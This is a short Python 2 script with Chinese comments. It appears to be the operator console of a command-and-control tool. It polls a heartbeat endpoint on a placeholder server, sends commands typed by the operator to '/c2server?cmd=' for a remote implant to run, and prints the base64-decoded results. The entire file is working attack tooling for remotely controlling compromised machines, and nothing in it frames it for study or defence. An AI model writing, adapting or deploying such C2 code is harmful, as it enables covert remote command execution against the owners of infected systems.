#! /usr/bin/env python
# coding=utf-8
import requests
import time
import os
import re
import threading
import base64


def send(c2cmd):
	url="http://ip:5000/c2server?cmd="+c2cmd
	#print url
	# 发送命令
	i=1
	try:
		while i<10:
			i=i+1
			s1= requests.get(url, timeout=10)
			#print s1.status_code
			if s1.status_code == 200:
				com= s1.content
				#print command
				if com == 'ok':
					return
			time.sleep(1)
	except:
		return None

def heartbeats():
	print "正在连接......"
	i=0
	j=0
	url0="http://ip:5000/c2heartbeat?control=test"
	while True:
		j+=1
		try:
			s0= requests.get(url0, timeout=5)
			if s0.status_code == 200:
				c1=s0.content
				break
		except:
			pass
		if j>40:
			print '\n失去连接'
			j=0
		time.sleep(1)
	print '已连接'
	global conn
	conn=1
	t1 = threading.Thread(target=main)
	t1.start()
	while True:
		i+=1
		if i>4:
			print '失去连接1'
			conn=0
			return
		# 每10秒接收一次心跳包
		try:
			s0= requests.get(url0, timeout=5)
			if s0.status_code == 200:
				c2=s0.content
			if c2!=c1:
				print '已连接\nCommand:'
				c1=c2
				c2=''
				i=0
		except:
			pass
		time.sleep(10)


def receive():
	url="http://ip:5000/c2server?results=test"
	# 命令执行结束的回显发送
	i=1
	try:
		while i<10:
			i=i+1
			s1= requests.get(url,timeout=30)
			if s1.status_code == 200:
				results= s1.content
				print base64.b64decode(results)
				return
			time.sleep(1)
	except:
		return None




def main():
	c2_command = ''
	while conn==1:
		c2_command = raw_input("Command:")
		send(c2_command)
		receive()
	return



if __name__ == '__main__':
	#启动心跳线程
	while True:
		heartbeats()
		conn=0
